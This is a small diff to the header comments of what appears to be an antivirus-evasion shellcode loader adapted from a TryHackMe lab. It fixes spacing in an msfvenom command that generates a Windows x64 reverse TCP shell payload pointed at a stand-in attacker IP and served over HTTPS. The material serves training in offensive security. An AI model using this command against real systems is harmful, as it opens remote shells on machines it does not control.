@@ -1,5 +1,5 @@
 // you can find original code at https://tryhackme.com/r/room/avevasionshellcode , at task 6, but the original code has many bugs
-//use this command to get shell code: msfvenom -p windows/x64/shell_reverse_tcp  LHOST=attacker_ipLPORT=4433 -f raw -o /https/server/directory
+//use this command to get shell code: msfvenom -p windows/x64/shell_reverse_tcp  LHOST=attacker_ip LPORT=4433 -f raw -o /https/server/directory
 
 
 //use this commands to start https server :    
